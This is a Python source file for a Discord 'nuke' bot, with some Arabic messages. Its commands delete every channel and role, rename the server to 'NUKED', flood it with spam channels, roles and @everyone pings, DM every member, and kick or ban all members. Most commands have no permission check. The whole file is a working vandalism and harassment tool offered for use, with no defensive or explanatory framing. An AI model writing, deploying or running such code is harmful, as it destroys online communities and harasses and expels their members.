import discord
from discord.ext import commands
import os
import asyncio
from dotenv import load_dotenv

load_dotenv()
TOKEN = os.getenv("DISCORD_TOKEN")

intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents)

@bot.event
async def on_ready():
    print(f"✅ Logged in as {bot.user}")

@bot.command(name="dc")
async def delete_all(ctx):
    for channel in ctx.guild.channels:
        try:
            await channel.delete()
        except:
            pass

@bot.command(name="sh")
async def spam_channels(ctx, amount: int = 5):
    for i in range(amount):
        await ctx.guild.create_text_channel(f"spam-{i+1}")

@bot.command(name="cn")
async def chaos(ctx, *, name):
    for channel in ctx.guild.channels:
        try:
            await channel.edit(name=name)
        except:
            pass

@bot.command(name="sn")
async def nuke_server(ctx, *, name="☢️ NUKED"):
    try:
        await ctx.guild.edit(name=name)
    except:
        pass

@bot.command(name="role_d")
async def delete_roles(ctx):
    for role in ctx.guild.roles:
        try:
            await role.delete()
        except:
            pass

@bot.command(name="role")
async def spam_roles(ctx, amount: int = 5):
    for i in range(amount):
        try:
            await ctx.guild.create_role(name=f"SPAM-{i+1}")
        except:
            pass

@bot.command(name="spam_here")
async def spam_here(ctx, amount: int = 10, delay: float = 0.3, *, message: str = "🖕🏻"):
    for i in range(amount):
        await ctx.send(f"{message} ({i+1}/{amount})")
        await asyncio.sleep(delay)

@bot.command(name="spam_here_eve")
async def spam_here_ping(ctx, amount: int = 10, delay: float = 0.3, *, message: str = "🖕🏻"):
    for i in range(amount):
        await ctx.send(f"@everyone {message} ({i+1}/{amount})")
        await asyncio.sleep(delay)

@bot.command(name="spam_all")
async def spam_all(ctx, amount: int = 5, delay: float = 0.5, *, message: str = "🖕🏻"):
    for i in range(amount):
        for channel in ctx.guild.text_channels:
            try:
                await channel.send(f"{message} ({i+1}/{amount})")
            except:
                pass
        await asyncio.sleep(delay)

@bot.command(name="spam_all_eve")
async def spam_all_ping(ctx, amount: int = 5, delay: float = 0.5, *, message: str = "🖕🏻"):
    for i in range(amount):
        for channel in ctx.guild.text_channels:
            try:
                await channel.send(f"@everyone {message} ({i+1}/{amount})")
            except:
                pass
        await asyncio.sleep(delay)

@bot.command()
async def kick_all(ctx):
    for member in ctx.guild.members:
        if member != ctx.author and member != bot.user:
            try:
                await member.kick(reason="تجربة")
            except:
                pass

@bot.command()
async def ban_all(ctx):
    for member in ctx.guild.members:
        if member != ctx.author and member != bot.user:
            try:
                await member.ban(reason="تجربة")
            except:
                pass

@bot.command(name="dm")
async def dm_all(ctx, *, message="🔥 تجربة من البوت"):
    for member in ctx.guild.members:
        try:
            await member.send(message)
        except:
            pass

@bot.command(name="cc")
async def create_channels(ctx, amount: int, *, name: str):
    for i in range(amount):
        try:
            await ctx.guild.create_text_channel(f"{name}-{i+1}")
        except:
            pass

@bot.command()
async def reset_channel_names(ctx, *, base_name="channel"):
    for index, channel in enumerate(ctx.guild.channels, start=1):
        try:
            await channel.edit(name=f"{base_name}-{index}")
        except:
            pass

@bot.command()
async def delete_channel(ctx, *, channel_name):
    channel = discord.utils.get(ctx.guild.channels, name=channel_name)
    if channel:
        try:
            await channel.delete()
            await ctx.send(f"🗑️ تم حذف: {channel_name}")
        except:
            await ctx.send("❌ فشل الحذف")
    else:
        await ctx.send("❌ لا توجد قناة بهذا الاسم")

@bot.command()
async def delete_channels_starting_with(ctx, *, prefix):
    for channel in ctx.guild.channels:
        if channel.name.startswith(prefix):
            try:
                await channel.delete()
            except:
                pass

@bot.command(name="lock")
@commands.has_permissions(administrator=True)
async def lockall(ctx):
    for channel in ctx.guild.text_channels:
        overwrite = channel.overwrites_for(ctx.guild.default_role)
        overwrite.send_messages = False
        await channel.set_permissions(ctx.guild.default_role, overwrite=overwrite)
    await ctx.send("🔒 تم قفل جميع الرومات الكتابية!")

@bot.command(name="open")
@commands.has_permissions(administrator=True)
async def unlockall(ctx):
    for channel in ctx.guild.text_channels:
        overwrite = channel.overwrites_for(ctx.guild.default_role)
        overwrite.send_messages = True
        await channel.set_permissions(ctx.guild.default_role, overwrite=overwrite)
    await ctx.send("✅ تم فتح جميع الرومات الكتابية!")

@bot.command(name="nick_all")
async def rename_all_members(ctx, *, new_nick="😈 Nuked"):
    for member in ctx.guild.members:
        try:
            if member != ctx.author and member != bot.user:
                await member.edit(nick=new_nick)
        except:
            pass
    await ctx.send("✅ Changed nicknames for all members I could.")

@bot.command(name="ser")
async def servers(ctx):
    server_list = [f"- {guild.name} (ID: {guild.id})" for guild in bot.guilds]
    response = "\n".join(server_list)
    await ctx.send(f"🔍 البوت موجود في {len(bot.guilds)} سيرفرات:\n{response}")

bot.run(TOKEN)